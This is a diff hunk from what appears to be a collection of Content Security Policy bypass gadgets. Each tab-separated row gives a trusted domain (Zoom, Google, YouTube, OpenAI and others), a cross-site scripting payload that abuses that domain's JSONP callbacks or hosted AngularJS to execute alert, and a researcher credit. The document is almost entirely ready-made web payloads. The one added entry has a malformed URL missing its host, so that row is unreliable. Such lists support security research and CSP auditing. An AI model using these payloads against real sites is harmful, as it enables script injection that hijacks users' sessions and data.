@@ -77,6 +77,7 @@ st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600
 static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	renniepak
 storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>	kevin_mizu
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>	
+sync.im-apps.net	<script src="https:///imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>	renniepak
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>	YoeriVegt
 tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>	renniepak
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>	renniepak
